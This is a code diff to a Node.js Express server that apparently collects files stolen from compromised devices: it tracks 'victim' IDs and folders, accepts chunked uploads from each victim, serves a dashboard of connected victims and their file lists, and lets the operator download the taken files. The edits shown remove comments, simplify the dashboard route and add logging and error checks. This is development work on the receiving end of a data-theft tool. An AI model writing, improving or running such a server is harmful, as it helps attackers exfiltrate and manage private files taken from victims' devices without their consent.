@@ -49,7 +49,7 @@ if (!fs.existsSync(OUTPUT_BASE_DIR)) {
 
 const victimFolders = {};
 const victimFileCounts = {};
-const victimTotalFiles = {}; // Keeps track of total file count (total chunks)
+const victimTotalFiles = {};
 const victimFiles = {};
 const connectedDevices = {};
 
@@ -121,7 +121,7 @@ app.post('/upload', (req, res) => {
       victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
       fs.mkdirSync(victimFolders[victimId], { recursive: true });
       victimFileCounts[victimId] = 0;
-      victimTotalFiles[victimId] = totalChunks; // Set totalChunks here for the specific victim
+      victimTotalFiles[victimId] = totalChunks;
     }
 
     const victimFolder = victimFolders[victimId];
@@ -157,17 +157,7 @@ app.post('/upload', (req, res) => {
 
 // Route to provide dashboard data
 app.get('/dashboard-data', (req, res) => {
-  const dashboardData = Object.keys(connectedDevices).map(victimId => {
-    return {
-      victimId: victimId,
-      totalFiles: victimTotalFiles[victimId] || 'NA', // Ensure the total files are sent
-      filesTransferred: connectedDevices[victimId].filesTransferred,
-      lastConnectionTime: connectedDevices[victimId].lastConnectionTime,
-      fileList: connectedDevices[victimId].fileList,
-    };
-  });
-
-  res.json(dashboardData);
+  res.json(connectedDevices);
 });
 
 // Route to download files
@@ -175,6 +165,7 @@ app.get('/download/:victimId/:filename', (req, res) => {
   try {
     const { victimId, filename } = req.params;
 
+    // Check if victim folder exists first
     if (!victimFolders[victimId]) {
       return res.status(404).json({ error: 'Victim folder not found' });
     }
@@ -182,16 +173,22 @@ app.get('/download/:victimId/:filename', (req, res) => {
     const victimFolder = victimFolders[victimId];
     const filePath = path.join(victimFolder, filename);
 
+    // Check if the file exists in the folder
     if (!fs.existsSync(filePath)) {
+      console.log(`❌ File not found at ${filePath}`);
       return res.status(404).json({ error: 'File not found' });
     }
 
+    console.log(`📂 Downloading file from: ${filePath}`);
+    
+    // Proceed to download the file
     res.download(filePath, filename, (err) => {
       if (err) {
         console.error(`❌ Error sending file:`, err);
-        res.status(500).json({ error: 'Error sending file' });
+        return res.status(500).json({ error: 'Error sending file' });
       }
     });
+
   } catch (error) {
     console.error(`❌ Error in download route:`, error);
     res.status(500).json({ error: 'Internal server error' });
